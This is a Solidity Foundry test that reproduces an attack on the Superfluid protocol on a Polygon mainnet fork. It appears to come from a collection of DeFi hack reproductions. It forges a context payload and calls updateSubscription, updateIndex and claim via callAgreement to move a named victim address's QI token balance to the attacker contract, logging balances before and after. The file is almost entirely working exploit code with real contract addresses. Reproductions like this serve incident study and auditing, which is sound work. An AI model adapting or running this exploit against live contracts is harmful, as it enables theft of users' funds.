// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import {IERC20} from "../../interfaces/IERC20.sol";


interface ISuperfluid {
    function callAgreement(address agreementClass, bytes memory callData, bytes memory userData) external returns (bytes memory);
}

contract Exploit_Superfluid is TestHarness, TokenBalanceTracker {
    ISuperfluid internal superfluid = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    address internal agreementIDAV2 = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;

    IERC20 internal qi = IERC20(0xe1cA10e6a10c0F72B74dF6b7339912BaBfB1f8B5);

    address internal victim = 0x5073c1535A1a238E7c7438c553F1a2BaAC366cEE;

    uint256 constant internal CALL_INFO_CALL_TYPE_SHIFT = 32;
    uint256 constant internal CALL_INFO_CALL_TYPE_MASK = 0xF << CALL_INFO_CALL_TYPE_SHIFT;
    uint256 constant internal CALL_INFO_APP_LEVEL_MASK = 0xFF;


    function setUp() external {
        cheat.createSelectFork("polygon", 24685147); 
        cheat.deal(address(this), 0);

        addTokenToTracker(address(qi));
        updateBalanceTracker(address(this));
        updateBalanceTracker(victim);


        console.log("==== INITIAL BALANCES ====");
        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Victim', victim);
    }


    function test_attack() external {

        // The malicious payload, encoded in hex.
        // bytes memory maliciousPayloadFromTraces = hex'0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005073c1535a1a238e7c7438c553f1a2baac366cee000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000';
        
        bytes memory maliciousPayloadConstructed = abi.encode(
            abi.encode(
                encodeCallInfo(0,1), // Get encoded call info by shifting depending on the app and call type.
                block.timestamp,
                victim, 
                bytes4(0),
                new bytes(0)
            ),
            abi.encode(
                0,
                0,
                address(0),
                address(0)
            )
        );
       
        bytes memory callData1 = abi.encodeWithSignature("updateSubscription(address,uint32,address,uint128,bytes)", 
            address(qi),
            98789,
            address(this),
            qi.balanceOf(victim),
            maliciousPayloadConstructed
        );
        

        bytes memory callData2 = abi.encodeWithSignature("updateIndex(address,uint32,uint128,bytes)", 
            address(qi),
            98789,
            1,
            maliciousPayloadConstructed
        );

        bytes memory callData3 = abi.encodeWithSignature("claim(address,address,uint32,address,bytes)", 
            address(qi),
            victim,
            98789,
            address(this),
            new bytes(0)
        );

        console.log("==== STEP 1: INJECT PAYLOAD ====");
        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Victim', victim);
                
        superfluid.callAgreement(agreementIDAV2, callData1, new bytes(0));

        superfluid.callAgreement(agreementIDAV2, callData2, new bytes(0));

        superfluid.callAgreement(agreementIDAV2, callData3, new bytes(0));


        console.log("==== STEP 2: AFTER INJECTION ====");
        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Victim', victim);
    }

        
    function encodeCallInfo(uint8 appLevel, uint8 callType)
        internal pure
        returns (uint256 callInfo)
    {
        return uint256(appLevel) | (uint256(callType) << CALL_INFO_CALL_TYPE_SHIFT);
    }
    
    function decodeCallInfo(uint256 callInfo)
        internal pure
        returns (uint8 appLevel, uint8 callType)
    {
        appLevel = uint8(callInfo & CALL_INFO_APP_LEVEL_MASK);
        callType = uint8((callInfo & CALL_INFO_CALL_TYPE_MASK) >> CALL_INFO_CALL_TYPE_SHIFT);
    }
}

